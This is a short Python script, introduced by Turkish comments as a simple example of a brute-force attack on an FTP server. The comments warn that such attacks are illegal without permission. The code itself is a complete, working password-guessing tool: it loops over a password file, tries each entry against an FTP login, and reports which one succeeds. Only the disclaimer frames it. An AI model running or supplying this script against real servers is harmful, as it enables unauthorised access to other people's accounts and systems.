# Python dilinde bir FTP sunucusuna brute force saldırısı yapmak için basit bir örnek 
# kod bulunmaktadır. Ancak, lütfen unutmayın ki, bu tür saldırılar yasa dışıdır ve 
# başka kişilerin veya sistemlerin 
# izni olmadan gerçekleştirilmemelidir. 
# Bu kodu yasal ve etik olarak kabul edilebilir bir şekilde kullanmalısınız.


from ftplib import FTP

def brute_force_ftp(server, username, passwords_file):
    ftp = FTP(server)
    passwords = open(passwords_file, 'r')

    for password in passwords:
        password = password.strip()
        try:
            ftp.login(username, password)
            print(f"Successful login! Username: {username}, Password: {password}")
            break
        except Exception as e:
            print(f"Failed login! Username: {username}, Password: {password}")
    
    passwords.close()
    ftp.quit()

server = "ftp.example.com"
username = "your-username"
passwords_file = "passwords.txt"

brute_force_ftp(server, username, passwords_file)
